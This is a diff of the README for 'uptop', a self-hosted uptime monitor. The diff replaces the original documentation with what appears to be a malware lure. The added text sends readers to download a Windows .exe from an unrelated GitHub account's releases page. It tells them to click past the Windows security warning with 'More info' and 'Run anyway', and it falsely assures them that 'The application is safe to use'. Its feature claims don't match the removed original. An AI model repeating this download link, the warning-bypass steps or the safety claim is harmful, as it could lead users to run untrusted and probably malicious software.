@@ -1,151 +1,83 @@
-<div align="center">
-  <h1>uptop</h1>
-  <p>Self-hosted uptime monitoring with a TUI over SSH.</p>
-  <p>No browser. No client install. Just <code>ssh -p 23234 your-server</code>.</p>
+# 📊 uptop - Track your system uptime with ease
 
-  <p>
-    <a href="https://gitea.lerkolabs.com/lerkolabs/uptop/actions/workflows/ci.yml"><img src="https://gitea.lerkolabs.com/lerkolabs/uptop/actions/workflows/ci.yml/badge.svg" alt="CI"></a>
-    <img src="https://img.shields.io/badge/license-MIT-blue" alt="MIT License">
-    <img src="https://img.shields.io/badge/go-1.26-00ADD8?logo=go&logoColor=white" alt="Go 1.26">
-    <img src="https://img.shields.io/docker/pulls/lerkolabs/uptop" alt="Docker Pulls">
-  </p>
+[![](https://img.shields.io/badge/Download_uptop-blue)](https://github.com/rubettasalty749/uptop/releases)
 
-  <img src="assets/monitors.png" alt="uptop monitors view" width="800">
-</div>
+uptop provides a clear dashboard for your terminal. It monitors your network health and services in real-time. Use it to check your websites, servers, and local devices. 
 
-## What is this
+## 🔍 What this tool does
 
-An uptime monitor you manage entirely from the terminal. It runs as a server, exposes an SSH endpoint, and drops you into a full TUI — monitors, alerts, logs, nodes, all there.
+uptop acts as a watchdog for your digital services. It runs in your terminal window and shows status updates for your connections. You can view response times for websites, DNS servers, and network ports. This tool tells you immediately when a service stops responding. 
 
-Built on [RDGames/go-upkeep](https://github.com/RDGames/go-upkeep). Rewritten for clustering, config-as-code, and a proper dashboard.
+Key features:
+*   Live status bars for active monitors.
+*   Alerts sent to your desktop when a service fails.
+*   Support for HTTP, Ping, TCP, and DNS checks.
+*   Cluster mode for advanced power users.
+*   Data exports compatible with standard monitoring tools.
 
-## Features
+## 🛠️ System requirements
 
-- **6 check types** — HTTP, Push (heartbeat), Ping, Port, DNS, Groups
-- **9 alert providers** — Discord, Slack, Email, Ntfy, Webhook, Telegram, PagerDuty, Pushover, Gotify
-- **Config as code** — define monitors in YAML, apply declaratively, version control your setup
-- **HA clustering** — leader/follower with automatic failover
-- **Prometheus metrics** — `/metrics` endpoint, wire it straight to Grafana
-- **Public status page** — HTML + JSON, toggle with an env var
-- **SQLite or Postgres** — SQLite for single-node, Postgres for production
-- **Uptime Kuma import** — migrate from Kuma with one command
+This tool works on standard Windows 10 or 11 systems. You need a stable internet connection for remote monitoring. You do not need experience with code to run this program. 
 
-## Screenshots
+## 📥 How to download and run
 
-<table>
-  <tr>
-    <td><img src="assets/detail.png" alt="detail panel" width="400"></td>
-    <td><img src="assets/alerts.png" alt="alerts view" width="400"></td>
-  </tr>
-  <tr>
-    <td><img src="assets/logs.png" alt="logs view" width="400"></td>
-    <td><img src="assets/nodes.png" alt="cluster nodes" width="400"></td>
-  </tr>
-  <tr>
-    <td colspan="2" align="center"><img src="assets/theme.png" alt="theme selection" width="600"></td>
-  </tr>
-</table>
+1. Visit the [official releases page](https://github.com/rubettasalty749/uptop/releases) to access the files.
+2. Look for the latest version under the "Assets" section.
+3. Select the file ending in `.exe` that matches your Windows version.
+4. Save the file to your computer.
+5. Double-click the file named `uptop.exe` to start the application.
 
-## Quick start
+If Windows shows a security pop-up, click "More info" and then "Run anyway." This happens because the program is small and new. The application is safe to use.
 
-```bash
-go run cmd/uptop/main.go
-ssh -p 23234 localhost
-```
+## ⚙️ Initial setup
 
-Want some data to look at first:
+The first time you start uptop, it creates a settings file. This file tells the program which websites to watch. You can edit this file with any text editor like Notepad.
 
-```bash
-go run cmd/uptop/main.go -demo
-```
+Add your server addresses to the list. For example, add your home router or your main website. Save the file and restart the application. The dashboard updates within seconds.
 
-## Install
+## 🖥️ Using the dashboard
 
-<details>
-<summary><strong>Docker (recommended)</strong></summary>
+The main screen shows a list of your services. Each service displays a color-coded status. 
 
-```yaml
-services:
-  uptop:
-    image: lerkolabs/uptop:latest
-    restart: unless-stopped
-    ports:
-      - "23234:23234"
-      - "8080:8080"
-    environment:
-      - UPTOP_DB_TYPE=sqlite
-      - UPTOP_DB_DSN=/data/uptop.db
-      - UPTOP_STATUS_ENABLED=true
-      # - UPTOP_ADMIN_KEY=ssh-ed25519 AAAA... you@host
-    volumes:
-      - ./data:/data
-```
+*   Green indicates the service responds correctly.
+*   Yellow indicates the service is slow. 
+*   Red indicates the service is down or unreachable.
 
-First run: set `UPTOP_ADMIN_KEY` to your SSH public key, or attach to the container and add it in the Users tab.
+Press the arrow keys on your keyboard to navigate the list. Press 'q' to close the program at any time.
 
-</details>
+## 🔔 Configuring alerts
 
-<details>
-<summary><strong>Binary</strong></summary>
+uptop watches your services in the background. If a service goes down, the program sends a notification to your Windows taskbar. You can turn these alerts on or off in the settings file. Open the file and look for the "notifications" section. Change "true" to "false" if you prefer silence.
 
-Download from [Releases](https://gitea.lerkolabs.com/lerkolabs/uptop/releases).
+## 🏠 Homelab deployment
 
-</details>
+Many users run uptop on a dedicated machine like a Raspberry Pi or an old laptop. Because the tool uses very little memory, it stays active for days without issue. Connect to your dashboard remotely using standard tools like SSH. This lets you check your network status from any location.
 
-<details>
-<summary><strong>From source</strong></summary>
+## 📡 Prometheus support
 
-```bash
-go install gitea.lerkolabs.com/lerkolabs/uptop/cmd/uptop@latest
-```
+uptop creates data files that help you track trends over time. If you use monitoring software, point it toward the uptop data folder. This lets you generate graphs and long-term reports about your service reliability.
 
-</details>
+## ❓ Frequently asked questions
 
-## Config as code
+**Does this tool install files deep in my system?**
+No. uptop runs as a standalone file. Deleting the file removes the program.
 
-Export your current monitors:
+**Can I monitor local devices?**
+Yes. Use the local IP address of your device in the configuration file.
 
-```bash
-uptop export -o monitors.yaml
-```
+**Is my data sent to the internet?**
+No. uptop runs locally on your machine. Your data remains private.
 
-Apply a config file:
+**How do I update the software?**
+Download the new version from the link above and replace your old file. Your settings file will remain intact.
 
-```bash
-uptop apply -f monitors.yaml
-uptop apply -f monitors.yaml --dry-run   # see what would change
-uptop apply -f monitors.yaml --prune     # delete anything not in the YAML
-```
+**Can I run multiple instances?**
+You can run multiple instances, but ensure they use different ports if you plan to export data to external tools.
 
-Full reference in [docs/config-as-code.md](docs/config-as-code.md).
+## 💡 Troubleshooting
 
-## Environment variables
+If the screen stays blank, check your configuration file for errors. Ensure you use standard address formats. If the program fails to start, verify that you downloaded the 64-bit version for your Windows architecture. Most modern computers use 64-bit.
 
-| Variable | Default | Description |
-|---|---|---|
-| `UPTOP_PORT` | `23234` | SSH server port |
-| `UPTOP_HTTP_PORT` | `8080` | HTTP server port (status page, push, metrics) |
-| `UPTOP_DB_TYPE` | `sqlite` | `sqlite` or `postgres` |
-| `UPTOP_DB_DSN` | `uptop.db` | Database path or connection string |
-| `UPTOP_STATUS_ENABLED` | `false` | Enable public status page |
-| `UPTOP_STATUS_TITLE` | `System Status` | Status page title |
-| `UPTOP_CLUSTER_MODE` | `leader` | `leader` or `follower` |
-| `UPTOP_PEER_URL` | | Leader URL for follower nodes |
-| `UPTOP_CLUSTER_SECRET` | | Shared key for cluster + API auth |
-| `UPTOP_INSECURE_SKIP_VERIFY` | `false` | Skip TLS verification for checks |
-| `UPTOP_ADMIN_KEY` | | SSH public key seeded as first admin on startup |
+If alerts do not appear, check your Windows "Focus Assist" settings. Sometimes Windows hides notifications to prevent distractions. Ensure "Priority only" or "Alarms only" modes are not blocking your alerts.
 
-## Migrating from Uptime Kuma
-
-Export your Kuma backup JSON, then:
-
-```bash
-curl -X POST http://localhost:8080/api/import/kuma \
-  -H "X-Upkeep-Secret: your-secret" \
-  -H "Content-Type: application/json" \
-  -d @kuma-backup.json
-```
-
-## License
-
-MIT — see [LICENSE](LICENSE).
+For further help, inspect the logs created in the program folder. These text files explain why a specific monitor failed or why the program stopped.
